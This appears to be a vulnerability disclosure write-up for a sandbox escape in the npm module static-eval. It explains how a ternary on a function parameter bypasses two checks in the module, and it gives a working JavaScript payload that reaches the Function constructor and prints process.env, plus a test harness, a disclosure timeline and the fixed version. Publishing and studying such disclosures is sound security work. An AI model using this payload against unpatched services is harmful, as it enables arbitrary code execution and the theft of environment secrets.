Github: https://github.com/browserify/static-eval

Npm: https://www.npmjs.com/package/static-eval

The static-eval module is used to evaluate statically-analyzable expressions

Matt Austin has found the first sandbox escape vulnerability in the module1, the patch he proposed was bypassed later by Matías Lang 2, Matías's technique relied on the knowledge of a variable name that is passed to Static-eval "vars" variable, and he proposed a patch that protects against his technique. I have found a new exploitation technique that bypasses Matt's patch and doesn't rely on using variable names passed to the "vars" variable which make it more dangerous.

The payload
----------
```
 #nodejs eval.js '(function myTag(y){return ""[!y?"__proto__":"constructor"][y]})("constructor")("console.log(process.env)")()'
 #cat eval.js 
 var evaluate = require('static-eval'); 
 var parse = require('esprima').parse; 
 var src = process.argv[2]; 
 var ast = parse(src).body[0].expression; 
 console.log(evaluate(ast))
```
![Alt text](run.PNG?raw=true)

Restriction - 1
--------------
```
 else if (node.type === 'MemberExpression') { 
 var obj = walk(node.object); 
 // do not allow access to methods on Function 
 if((obj === FAIL) || (typeof obj == 'function')){ 
 return FAIL; 
 }
```
The above check makes sure that the user input doesn't call a function method, this will protect against normal payloads like:
```
"".constructor.constructor
```
because typeof ```"".constructor == 'function'```.

Restriction - 2
----------------
```
for(var i=0; i<node.params.length; i++){ 
 var key = node.params[i]; 
 if(key.type == 'Identifier'){ 
 vars[key.name] = null; 
 } 
 else return FAIL; 
 }
```
If the user input contains a function definition “FunctionExpression”, Static-eval will set the value for all the function arguments to null during the AST parsing, however when the function is being executed in runtime its arguments will receive their values from the call statement

Bypassing the restrictions
------------------------
I created a payload that will trick the first restriction by providing a fake object of type "object" during the AST parsing and provide the correct object of type function during the runtime.

**during the AST parsing:**
```
y=null 
""[!y?"__proto__":"constructor"] ===evaluate===> ""["__proto__"] ===> which has typeof = "object" ===> restrictions bypassed :)
```
**during the runtime:**
```
y="constructor" 
""[!y?"__proto__":"constructor"] ===evaluate===> ""["constructor"] ===> access gained to constructor function
```
Timeline
-----------
The Issue was reported to NPM on 7-Oct-2019
Fixed on v2.0.3 ```https://github.com/browserify/static-eval/releases/tag/v2.0.3```

References
---------
1 https://maustin.net/articles/2017-10/static_eval
2 https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/

